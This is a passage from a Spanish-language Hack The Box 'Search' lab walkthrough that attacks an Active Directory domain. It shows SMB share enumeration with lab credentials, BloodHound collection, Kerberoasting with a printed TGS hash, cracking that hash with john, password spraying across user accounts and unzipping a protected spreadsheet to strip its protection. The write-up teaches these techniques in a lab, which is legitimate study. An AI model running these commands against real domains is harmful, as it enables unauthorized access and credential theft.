[-] User Kylee.Davila doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Melanie.Santiago doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Hunter.Kirby doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Annabelle.Wells doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ada.Gillespie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Gunnar.Callahan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Aarav.Fry doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Colby.Russell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Eve.Galvan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jeramiah.Fritz doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Cade.Austin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Keely.Lyons doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Abby.Gonzalez doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Joy.Costa doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Vincent.Sutton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Cesar.Yang doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Camren.Luna doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tyshawn.Peck doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Keith.Hester doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Braeden.Rasmussen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Angel.Atkinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Sierra.Frye doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Maci.Graves doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Judah.Frye doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tristen.Christian doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Crystal.Greer doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kayley.Ferguson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Haven.Summers doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Isabela.Estrada doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaylin.Bird doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Angie.Duffy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Claudia.Pugh doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jordan.Gregory doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User web_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tristan.Davies doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- Bueno vamos a ver recursos compartidos por `smb`.

```bash
➜  content crackmapexec smb 10.129.229.57 -u hope.sharp  -p 'IsolationIsKey?' --shares
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey?
SMB         10.129.229.57   445    RESEARCH         [+] Enumerated shares
SMB         10.129.229.57   445    RESEARCH         Share           Permissions     Remark
SMB         10.129.229.57   445    RESEARCH         -----           -----------     ------
SMB         10.129.229.57   445    RESEARCH         ADMIN$                          Remote Admin
SMB         10.129.229.57   445    RESEARCH         C$                              Default share
SMB         10.129.229.57   445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.129.229.57   445    RESEARCH         helpdesk
SMB         10.129.229.57   445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.129.229.57   445    RESEARCH         NETLOGON        READ            Logon server share
SMB         10.129.229.57   445    RESEARCH         RedirectedFolders$ READ,WRITE
SMB         10.129.229.57   445    RESEARCH         SYSVOL          READ            Logon server share
```

- Vamos a ver lo que hay dentro de `RedirectedFolders$`.

- No vemos nada interesante.

```bash
➜  content smbmap -H 10.129.229.57 -u hope.sharp -p 'IsolationIsKey?' -r RedirectedFolders$ --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders$                                	READ, WRITE	
	./RedirectedFolders$
	dr--r--r--                0 Sun Apr  7 15:55:18 2024	.
	dr--r--r--                0 Sun Apr  7 15:55:18 2024	..
	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
	SYSVOL                                            	READ ONLY	Logon server share
```

## web_scv

- No encontramos nada a si que vamos a usar `bloodhound` para enumerar y buscar vías para escalar privilegios <https://github.com/BloodHoundAD/BloodHound/releases>.

- Para recolectar información vamos a usar `bloodhound-python`.

```bash
➜  content bloodhound-python -u 'hope.sharp' -p 'IsolationIsKey?' -c All -ns 10.129.229.57 -d search.htb
```

- Ahora tienes que subir los archivos `.json` al `bloodhound`.

- Estos son los usuarios que pertenecen al grupo `DOMAIN ADMINS` vemos a `Tristan.Davies`.

<p align="center">
<img src="/assets/images/htb-writeup-search/5.png">
</p>

- Y bueno vemos que el usuario WEB_SVC es `kerberoastable`.

<p align="center">
<img src="/assets/images/htb-writeup-search/6.png">
</p>

- Vamos a usar `GETUsersSPN.py` para solicitar el TGS del usuario.

```bash
➜  content impacket-GetUserSPNs search.htb/hope.sharp -request
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 07:59:11.329031  <never>



[-] CCache file is not found. Skipping...
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$ef435038d4624caac1c1e1fe0a242fae$ae77292d085f959d097ee988ae8ba39fbf3b7d1c3b72efc19bf7c8197ab68c88d4a4c34bca1261ca6239a5bbd9fa375ef3dd6f8aa38c808a10bf44ea06baecbfb6c5dc7d0549de684ec0fe3462726c8098094d298587ca0c2b99cfb4276502d95c324bb6f2197131536701dbd3325da0fa38952bbbdc7a062fa5d0cade5ac935e6442f7bd80e537709cc1b73553320669b4f711079735eb549a1243874520b7437ccb76e0c15b133c0887ab3842a93d8890e5da870844f5cfdbe9cdf0039ea2ad712c0503dd947afd82069d1f1bee24bdada3d372ae7f86cea9eb59cc7ebede4097ad20b177dd200f9268f4fc767b8ebfad8c932632f8d1559b913c9139a26fe10eec2c856faedb948e266fc569d3d1ebf61a294c464ccf3952880172acc414085edeb9f8a9faef28e8e4885308949c200716c8918c7850b7bbdb89f89a6d63e03d0a590672599501c0daae91901eb6c87f1ebe9d2ea01a44014ffcf4d8e48d652165b05108031e1cabbaf86699b6bcb918e3fc647766a4f34328d3900e1f562c9dea1b170d4d24e2105a54421f86b8acef8d06b33b48bbb74693587a49710c1d589d9273c5a6740ade98557cc16cca284016d7e577190941c227be7933dbd9ae835ed1faf2a5579cd65facbd985dc4af88bb41318cc285077fb813541887b1868fd963de1291e19144f698a1b4ff723bd98f3e6bf81cfa9491d1a8f089107fceac81ba512d3a4c0e0cbf292051c08296870a1df3e90bd2470c3fec06c0f24aac52f2f39446b00052bed6b414fe570a6638b8b5adf2227b9fe3aacd7e43b980b65b3bce8a515340940a147bc00722f9831d718f9f20e9e46964fe871841663c0c42af96de540f30456f7cc011b31df229dd4d21e9c5606c7d09e24f36173461a30453b717c6813bdc5eb64c8d9d94e08e54d311b71fdf66ec1595e6ec5c3dfce1c2e0459c478dabecbf8396b750c8a9d9ec217d17b9291a3aee831dc4ab1a94b003e017f29e249520f2a38e62243da55663cf3b377a29501d979354c9d0c0213b572c92ee473df614c07bb9b55ad7be3684b16aaba088e340369c510c387b6395b3f4f9d6c29360db08855b18727a42e0f5e57d06bde11d8322b4df72d289759ef67fe1c167a9113760ca205384cbdf3d4510fdcf5765131282647fbe9bb748119b3f6f909e63fe57b9fbe5a799aa3263c61fc0785337000be220dc05b71991f5ff470a9453e7412336fb11b1e9c42c7c888a04e3c57f786bdaa7905c49cea617c4e2c770918e2703c821620bff118f587d9e907ee99c36253a4181fb20b1bab49e5a5037450f6fce881f172fb54fd2ce6a5fc6f72825b7e0f3690918996b8599af819130aa4375065e00fa61b8c5a2cec01c43923ffab89909f39dea3d1e410cb4d8a05d778205fa99afaa61ffbfe0c00d54bab2486241dac57602941a26e40afc83ebb55d17453b4372b72e06161e946adecf8da
```

- En caso de que no funcione el ataque necesitas estar sincronizado al reloj de la maquina.

```bash
➜  ~ ntpdate 10.129.229.57
```

- Ahora como tenemos el hash podemos crackearlo.

```bash
➜  content john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:29 39.26% (ETA: 16:38:09) 0g/s 198514p/s 198514c/s 198514C/s marsters62..marshmallow4646
@3ONEmillionbaby (?)
1g 0:00:00:54 DONE (2024-04-07 16:37) 0.01835g/s 210937p/s 210937c/s 210937C/s @421eduymayte619..@123abc@
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Vamos a validar que la contraseña es correcta.

```bash
➜  content crackmapexec smb search.htb -u web_svc -p @3ONEmillionbaby
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         search.htb      445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby
```

## edgar.jacobs

- Como tenemos muchos usuarios podemos probar un ataque de fuerza bruta para ver si otros usuarios reutilizan la misma contraseña.

```bash
➜  content crackmapexec smb search.htb -u all.txt -p @3ONEmillionbaby --continue-on-success
➜  content crackmapexec smb search.htb -u all.txt -p @3ONEmillionbaby --continue-on-success
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         search.htb      445    RESEARCH         [-] search.htb\Administrator:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Guest:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\krbtgt:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Santino.Benjamin:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Payton.Harmon:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Trace.Ryan:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Reginald.Morton:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Eddie.Stevens:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Cortez.Hickman:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Chace.Oneill:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Abril.Suarez:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Savanah.Velazquez:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Antony.Russo:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Cameron.Melendez:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Edith.Walls:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Lane.Wu:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Arielle.Schultz:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Bobby.Wolf:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Blaine.Zavala:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Margaret.Robinson:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Celia.Moreno:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Kaitlynn.Lee:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Kyler.Arias:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Saniyah.Roy:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Sarai.Boone:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Jermaine.Franco:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Alfred.Chan:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Jamar.Holt:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Sandra.Wolfe:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Rene.Larson:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Yareli.Mcintyre:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Griffin.Maddox:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Prince.Hobbs:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Armando.Nash:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Sonia.Schneider:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Maeve.Mann:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Lizeth.Love:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Amare.Serrano:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Savanah.Knox:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Frederick.Cuevas:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [-] search.htb\Marshall.Skinner:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby
^C
```

- Y bueno el usuario `Edgar.Jacobs` reutiliza la misma contraseña.

- Vamos a listar los recursos compartidos por `smb` para el usuario `Edgar.Jacobs`.

- Vemos el `RedirectedFolders$` otra vez.

```bash
➜  content smbmap -H 10.129.229.57 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders$                                	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share
```

- Vamos a ver lo que hay dentro.

```bash
➜  content smbmap -H 10.129.229.57 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' --no-banner -r 'RedirectedFolders$'
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders$                                	READ, WRITE	
	./RedirectedFolders$
	dr--r--r--                0 Sun Apr  7 16:59:18 2024	.
	dr--r--r--                0 Sun Apr  7 16:59:18 2024	..
	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
	SYSVOL                                            	READ ONLY	Logon server share
➜  content
```

- Si nos metemos a nuestro directorio vemos que esta el `Desktop`.

```bash
➜  content smbmap -H 10.129.229.57 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' --no-banner -r 'RedirectedFolders$/edgar.jacobs/'
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders$                                	READ, WRITE	
	./RedirectedFolders$edgar.jacobs/
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	.
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	..
	dw--w--w--                0 Mon Aug 10 05:02:16 2020	Desktop
	dw--w--w--                0 Mon Aug 10 05:02:17 2020	Documents
	dw--w--w--                0 Mon Aug 10 05:02:17 2020	Downloads
	SYSVOL                                            	READ ONLY	Logon server share
```

- Y bueno vemos un `xlsx`.

```bash
➜  content smbmap -H 10.129.229.57 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' --no-banner -r 'RedirectedFolders$/edgar.jacobs/Desktop'
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders$                                	READ, WRITE	
	./RedirectedFolders$edgar.jacobs/Desktop
	dw--w--w--                0 Mon Aug 10 05:02:16 2020	.
	dw--w--w--                0 Mon Aug 10 05:02:16 2020	..
	dr--r--r--                0 Thu Apr  9 15:05:29 2020	$RECYCLE.BIN
	fr--r--r--              282 Mon Aug 10 05:02:16 2020	desktop.ini
	fr--r--r--             1450 Thu Apr  9 15:05:03 2020	Microsoft Edge.lnk
	fr--r--r--            23130 Mon Aug 10 05:30:05 2020	Phishing_Attempt.xlsx
	SYSVOL                                            	READ ONLY	Logon server share
```

>xlsx. Formato de archivo basado en XML y habilitado para macros de Excel 2007 a 2013. Almacena código de macros de VBA u hojas de macros de Excel 4.0 .

- Vamos a descargarlo para ver que es lo que hay dentro.

```bash
➜  document smbmap -H 10.129.229.57 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' --no-banner --download 'RedirectedFolders$/edgar.jacobs/Desktop/Phishing_Attempt.xlsx'
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)
[+] Starting download: RedirectedFolders$\edgar.jacobs\Desktop\Phishing_Attempt.xlsx (23130 bytes)
[+] File output to: /home/miguel/Hackthebox/Search/content/document/10.129.229.57-RedirectedFolders_edgar.jacobs_Desktop_Phishing_Attempt.xlsx
```

- Vamos abrirlo con `libreoffice`.

<p align="center">
<img src="/assets/images/htb-writeup-search/7.png">
</p>

- Vemos que la parte de `Passwords` esta protegida.

<p align="center">
<img src="/assets/images/htb-writeup-search/8.png">
</p>

- Vamos aplicar un `Bypass`.

```bash
➜  document unzip Phishing_Attempt.xlsx
Archive:  Phishing_Attempt.xlsx
  inflating: [Content_Types].xml
  inflating: _rels/.rels
  inflating: xl/workbook.xml
  inflating: xl/_rels/workbook.xml.rels
  inflating: xl/worksheets/sheet1.xml
  inflating: xl/worksheets/sheet2.xml
  inflating: xl/theme/theme1.xml
  inflating: xl/styles.xml
  inflating: xl/sharedStrings.xml
  inflating: xl/drawings/drawing1.xml
  inflating: xl/charts/chart1.xml
  inflating: xl/charts/style1.xml
  inflating: xl/charts/colors1.xml
  inflating: xl/worksheets/_rels/sheet1.xml.rels
  inflating: xl/worksheets/_rels/sheet2.xml.rels
  inflating: xl/drawings/_rels/drawing1.xml.rels
  inflating: xl/charts/_rels/chart1.xml.rels
  inflating: xl/printerSettings/printerSettings1.bin
  inflating: xl/printerSettings/printerSettings2.bin
  inflating: xl/calcChain.xml
  inflating: docProps/core.xml
  inflating: docProps/app.xml
```

- Vemos que `hashValue` y mas detalles del archivo protegido.

```bash
➜  document cat xl/worksheets/sheet2.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x14ac xr xr2 xr3" xmlns:x14ac="http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac" xmlns:xr="http://schemas.microsoft.com/office/spreadsheetml/2014/revision" xmlns:xr2="http://schemas.microsoft.com/office/spreadsheetml/2015/revision2" xmlns:xr3="http://schemas.microsoft.com/office/spreadsheetml/2016/revision3" xr:uid="{00000000-0001-0000-0100-000000000000}"><dimension ref="A1:D17"/><sheetViews><sheetView tabSelected="1" workbookViewId="0"><selection activeCell="F19" sqref="F19"/></sheetView></sheetViews><sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/><cols><col min="1" max="1" width="10.140625" bestFit="1" customWidth="1"/><col min="3" max="3" width="37.5703125" hidden="1" customWidth="1"/><col min="4" max="4" width="19.140625" bestFit="1" customWidth="1"/></cols><sheetData><row r="1" spans="1:4" x14ac:dyDescent="0.25"><c r="A1" t="s"><v>0</v></c><c r="B1" t="s"><v>1</v></c><c r="C1" t="s"><v>2</v></c><c r="D1" t="s"><v>31</v></c></row><row r="2" spans="1:4" x14ac:dyDescent="0.25"><c r="A2" t="s"><v>3</v></c><c r="B2" t="s"><v>4</v></c><c r="C2" t="s"><v>44</v></c><c r="D2" t="str"><f t="shared" ref="D2:D7" si="0">A2&amp;"."&amp;B2</f><v>Payton.Harmon</v></c></row><row r="3" spans="1:4" x14ac:dyDescent="0.25"><c r="A3" t="s"><v>5</v></c><c r="B3" t="s"><v>6</v></c><c r="C3" t="s"><v>45</v></c><c r="D3" t="str"><f t="shared" si="0"/><v>Cortez.Hickman</v></c></row><row r="4" spans="1:4" x14ac:dyDescent="0.25"><c r="A4" t="s"><v>7</v></c><c r="B4" t="s"><v>8</v></c><c r="C4" t="s"><v>46</v></c><c r="D4" t="str"><f t="shared" si="0"/><v>Bobby.Wolf</v></c></row><row r="5" spans="1:4" x14ac:dyDescent="0.25"><c r="A5" t="s"><v>9</v></c><c r="B5" t="s"><v>10</v></c><c r="C5" t="s"><v>35</v></c><c r="D5" t="str"><f t="shared" si="0"/><v>Margaret.Robinson</v></c></row><row r="6" spans="1:4" x14ac:dyDescent="0.25"><c r="A6" t="s"><v>12</v></c><c r="B6" t="s"><v>13</v></c><c r="C6" s="2" t="s"><v>36</v></c><c r="D6" t="str"><f t="shared" si="0"/><v>Scarlett.Parks</v></c></row><row r="7" spans="1:4" x14ac:dyDescent="0.25"><c r="A7" t="s"><v>14</v></c><c r="B7" t="s"><v>15</v></c><c r="C7" t="s"><v>37</v></c><c r="D7" t="str"><f t="shared" si="0"/><v>Eliezer.Jordan</v></c></row><row r="8" spans="1:4" x14ac:dyDescent="0.25"><c r="A8" t="s"><v>16</v></c><c r="B8" t="s"><v>17</v></c><c r="C8" t="s"><v>38</v></c><c r="D8" t="str"><f t="shared" ref="D8:D15" si="1">A8&amp;"."&amp;B8</f><v>Hunter.Kirby</v></c></row><row r="9" spans="1:4" x14ac:dyDescent="0.25"><c r="A9" t="s"><v>29</v></c><c r="B9" t="s"><v>30</v></c><c r="C9" s="3" t="s"><v>48</v></c><c r="D9" t="str"><f>A9&amp;"."&amp;B9</f><v>Sierra.Frye</v></c></row><row r="10" spans="1:4" x14ac:dyDescent="0.25"><c r="A10" t="s"><v>18</v></c><c r="B10" t="s"><v>19</v></c><c r="C10" s="2" t="s"><v>39</v></c><c r="D10" t="str"><f t="shared" si="1"/><v>Annabelle.Wells</v></c></row><row r="11" spans="1:4" x14ac:dyDescent="0.25"><c r="A11" t="s"><v>20</v></c><c r="B11" t="s"><v>21</v></c><c r="C11" t="s"><v>40</v></c><c r="D11" t="str"><f t="shared" si="1"/><v>Eve.Galvan</v></c></row><row r="12" spans="1:4" x14ac:dyDescent="0.25"><c r="A12" t="s"><v>22</v></c><c r="B12" t="s"><v>23</v></c><c r="C12" t="s"><v>41</v></c><c r="D12" t="str"><f t="shared" si="1"/><v>Jeramiah.Fritz</v></c></row><row r="13" spans="1:4" x14ac:dyDescent="0.25"><c r="A13" t="s"><v>24</v></c><c r="B13" t="s"><v>25</v></c><c r="C13" t="s"><v>42</v></c><c r="D13" t="str"><f t="shared" si="1"/><v>Abby.Gonzalez</v></c></row><row r="14" spans="1:4" x14ac:dyDescent="0.25"><c r="A14" t="s"><v>26</v></c><c r="B14" 